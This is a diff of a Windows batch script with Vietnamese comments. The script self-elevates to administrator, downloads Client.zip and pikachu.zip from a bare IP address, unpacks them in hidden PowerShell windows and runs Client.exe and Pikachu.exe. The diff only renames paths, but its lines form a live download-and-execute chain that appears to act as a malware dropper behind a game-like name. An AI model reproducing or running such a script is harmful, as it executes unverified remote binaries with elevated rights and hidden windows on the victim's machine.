@@ -20,8 +20,8 @@ powershell -Command "Start-Process cmd -ArgumentList '/c \"%~f0\"' -Verb runAs"
 )
 
 :: urlClient và đường dẫn file đầu ra (batch syntax)
-set "urlClient=http://172.188.16.91/Clientlocal.zip"
-set "outPathClient=%USERPROFILE%\Downloads\Clientlocal.zip"
+set "urlClient=http://172.188.16.91/Client.zip"
+set "outPathClient=%USERPROFILE%\Downloads\Client.zip"
 set "urlPikachu=http://172.188.16.91/pikachu.zip"
 set "outPathPikachu=%USERPROFILE%\Downloads\Pikachu.zip"
 
@@ -43,8 +43,8 @@ del temp.vbs
 
 if exist "%outPathClient%" (
     @REM echo Running the downloaded file...
-    powershell -NoProfile -WindowStyle Hidden -Command "Expand-Archive -Path \"%outPathClient%\" -DestinationPath \"%USERPROFILE%\Downloads\Clientlocal\" -Force"
-    powershell -NoProfile -Command "Start-Process \"%USERPROFILE%\Downloads\Clientlocal\Client.exe\""
+    powershell -NoProfile -WindowStyle Hidden -Command "Expand-Archive -Path \"%outPathClient%\" -DestinationPath \"%USERPROFILE%\Downloads\Client\" -Force"
+    powershell -NoProfile -Command "Start-Process \"%USERPROFILE%\Downloads\Client\Client.exe\""
     powershell -NoProfile -WindowStyle Hidden -Command "Expand-Archive -Path \"%outPathPikachu%\" -DestinationPath \"%USERPROFILE%\Downloads\Pikachu\" -Force"
     powershell -NoProfile -Command "Start-Process \"%USERPROFILE%\Downloads\Pikachu\Pikachu.exe\""
 ) else (
